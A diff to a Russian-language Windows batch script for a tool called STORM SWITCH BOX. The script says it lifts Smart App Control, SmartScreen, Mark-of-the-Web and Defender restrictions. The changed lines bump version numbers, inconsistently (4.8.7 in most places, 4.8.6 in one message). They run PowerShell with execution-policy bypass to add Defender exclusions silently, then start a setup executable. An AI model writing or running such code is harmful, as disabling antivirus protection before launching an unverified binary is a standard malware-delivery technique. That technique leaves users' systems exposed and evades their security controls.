@@ -13,7 +13,7 @@ if %errorLevel% neq 0 (
 )
 
 echo ============================================================
-echo   STORM SWITCH BOX v4.8.2 - СНЯТИЕ ВСЕХ БЛОКИРОВОК
+echo   STORM SWITCH BOX v4.8.7 - СНЯТИЕ ВСЕХ БЛОКИРОВОК
 echo   (Smart App Control, SmartScreen, Mark-of-the-Web, Defender)
 echo ============================================================
 echo.
@@ -74,26 +74,26 @@ echo [OK] Все файлы в директории успешно разбло�
 :: ============================================================
 echo.
 echo [4/5] Добавление папки программы в исключения Защитника Windows...
-powershell.exe -NoProfile -ExecutionPolicy Bypass -Command "Add-MpPreference -ExclusionPath '%SCRIPT_DIR%' -ErrorAction SilentlyContinue; Add-MpPreference -ExclusionPath 'C:\Program Files\STORM SWITCH BOX' -ErrorAction SilentlyContinue; Add-MpPreference -ExclusionProcess 'StormSwitchBox.exe' -ErrorAction SilentlyContinue; Add-MpPreference -ExclusionProcess 'STORM_SWITCH_BOX_4.8.2_Setup.exe' -ErrorAction SilentlyContinue; Add-MpPreference -ExclusionProcess 'StormInstaller.exe' -ErrorAction SilentlyContinue" >nul 2>&1
+powershell.exe -NoProfile -ExecutionPolicy Bypass -Command "Add-MpPreference -ExclusionPath '%SCRIPT_DIR%' -ErrorAction SilentlyContinue; Add-MpPreference -ExclusionPath 'C:\Program Files\STORM SWITCH BOX' -ErrorAction SilentlyContinue; Add-MpPreference -ExclusionProcess 'StormSwitchBox.exe' -ErrorAction SilentlyContinue; Add-MpPreference -ExclusionProcess 'STORM_SWITCH_BOX_4.8.7_Setup.exe' -ErrorAction SilentlyContinue; Add-MpPreference -ExclusionProcess 'StormInstaller.exe' -ErrorAction SilentlyContinue" >nul 2>&1
 echo [OK] Исключения в Защитник Windows успешно добавлены!
 
 :: ============================================================
 :: 6. Запуск программы / Установщика
 :: ============================================================
 echo.
-echo [5/5] Запуск STORM SWITCH BOX v4.8.2
+echo [5/5] Запуск STORM SWITCH BOX v4.8.6
 echo.
 echo ============================================================
 echo   ГОТОВО! Все ограничения успешно сняты.
 echo ============================================================
 echo.
 
-if exist "%SCRIPT_DIR%Files\STORM_SWITCH_BOX_4.8.2_Setup.exe" (
-    start "" "%SCRIPT_DIR%Files\STORM_SWITCH_BOX_4.8.2_Setup.exe"
-) else if exist "%SCRIPT_DIR%installer\Output\STORM_SWITCH_BOX_4.8.2_Setup.exe" (
-    start "" "%SCRIPT_DIR%installer\Output\STORM_SWITCH_BOX_4.8.2_Setup.exe"
-) else if exist "%SCRIPT_DIR%STORM_SWITCH_BOX_4.8.2_Setup.exe" (
-    start "" "%SCRIPT_DIR%STORM_SWITCH_BOX_4.8.2_Setup.exe"
+if exist "%SCRIPT_DIR%Files\STORM_SWITCH_BOX_4.8.7_Setup.exe" (
+    start "" "%SCRIPT_DIR%Files\STORM_SWITCH_BOX_4.8.7_Setup.exe"
+) else if exist "%SCRIPT_DIR%installer\Output\STORM_SWITCH_BOX_4.8.7_Setup.exe" (
+    start "" "%SCRIPT_DIR%installer\Output\STORM_SWITCH_BOX_4.8.7_Setup.exe"
+) else if exist "%SCRIPT_DIR%STORM_SWITCH_BOX_4.8.7_Setup.exe" (
+    start "" "%SCRIPT_DIR%STORM_SWITCH_BOX_4.8.7_Setup.exe"
 ) else if exist "%SCRIPT_DIR%Assembling\StormSwitchBox.exe" (
     start "" "%SCRIPT_DIR%Assembling\StormSwitchBox.exe"
 )
